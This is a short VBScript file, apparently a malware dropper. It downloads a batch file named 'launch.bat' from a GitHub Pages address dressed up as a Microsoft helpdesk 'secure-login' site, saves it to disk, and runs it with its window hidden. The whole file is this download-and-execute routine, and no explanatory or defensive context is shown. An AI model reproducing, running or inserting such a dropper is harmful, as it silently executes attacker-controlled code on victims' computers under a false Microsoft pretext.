Dim http, stream
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", "https://microsoft-helpdesk.github.io/secure-login/launch.bat", False
http.Send

Set stream = CreateObject("ADODB.Stream")
stream.Open
stream.Type = 1
stream.Write http.ResponseBody
stream.SaveToFile "launch.bat", 2
stream.Close

CreateObject("WScript.Shell").Run "launch.bat", 0, False
